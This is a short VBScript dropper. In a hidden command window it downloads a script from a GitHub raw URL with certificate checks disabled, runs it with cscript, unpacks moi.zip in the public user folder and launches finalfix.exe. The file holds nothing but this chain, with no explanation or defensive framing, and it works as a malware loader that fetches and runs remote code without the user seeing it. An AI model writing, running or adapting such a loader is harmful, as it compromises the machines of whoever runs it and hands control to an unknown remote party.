Set WshShell = CreateObject("WScript.Shell")  
WshShell.Run "cmd /c curl -k -f -s -L https://raw.githubusercontent.com/Hoangdepzaivcl/dcm/refs/heads/main/script.js -o c:\users\public\script.js && cscript c:\users\public\script.js && timeout /t 20 /nobreak && cd c:\users\public && tar -xf moi.zip && timeout /t 2 /nobreak && start c:\users\public\finalfix.exe", 0, False  
